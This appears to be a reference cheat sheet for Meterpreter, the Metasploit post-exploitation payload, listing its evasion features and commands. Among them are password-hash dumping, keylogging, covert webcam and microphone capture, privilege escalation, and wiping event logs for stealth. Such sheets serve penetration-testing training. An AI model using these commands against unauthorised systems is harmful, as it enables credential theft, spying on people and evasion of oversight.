# Meterpreter

Meterpreter is an advanced payload that runs in-memory (leaves no files on disk) and is used for post-exploitation.

## Key Features

- **In-Memory Only:** Runs entirely in RAM to avoid antivirus detection
    
- **Encrypted Communication:** Uses encrypted connections (TLS) to bypass IPS/IDS
    
- **Process Migration:** Can move itself to other processes (e.g., from spoolsv.exe to explorer.exe)
    
- **Extensible:** Functionality expandable via extensions and scripts
    

## Common Meterpreter Commands

## Basic System Info & Identification



`sysinfo`

Shows system details (OS, Architecture, Domain, etc.)



`getuid`

Shows the current user (e.g., NT AUTHORITY\SYSTEM)



`getpid`

Shows the current Process ID of Meterpreter

## Process Management



`ps`

Shows list of running processes



`migrate [PID]`

Moves Meterpreter to another process ID

## File Management



`ls`

Show files in current directory



`pwd`

Print Working Directory (current directory)



`cd [directory]`

Change directory (sometimes put path in quotes)



`download [file]`

Download file from target to your machine



`upload [file]`

Upload file from your machine to target



`search -f [filename]`

Search for files on the target

## Network



`ifconfig`

or



`ipconfig`

Show network interfaces and IP addresses



`netstat`

Show network connections



`arp`

Show ARP table

## Advanced Features



`hashdump`

Dumps password hashes (requires SYSTEM privileges)



`screenshot`

Takes screenshot of target desktop



`shell`

Opens a standard OS shell (cmd.exe / /bin/bash)



`background`

Puts current session in background (returns to msf)



`clearev`

Wipes Windows Event Logs (for stealth)

## User Activity Monitoring



`idletime`

Shows number of seconds user has been inactive



`screenshare`

View remote desktop in real-time



`screenshot`

Takes a screenshot of the current desktop

## Keylogging (Record Keystrokes)



`keyscan_start`

Starts recording keystrokes



`keyscan_dump`

Shows recorded keystrokes



`keyscan_stop`

Stops the keylogger

## Webcam & Audio



`webcam_list`

Shows available webcams



`webcam_snap`

Takes a photo with the webcam



`webcam_stream`

Starts a live video stream



`webcam_chat`

Starts a video chat session



`record_mic`

Records audio via microphone (default X seconds)

## Pro Tips

- Use `migrate` to a stable process (like explorer.exe or services.exe) immediately after entry for stability
    
- `getsystem` command can attempt to automatically gain SYSTEM privileges
    
- With `shell` you get a normal command prompt, type `exit` to return to Meterpreter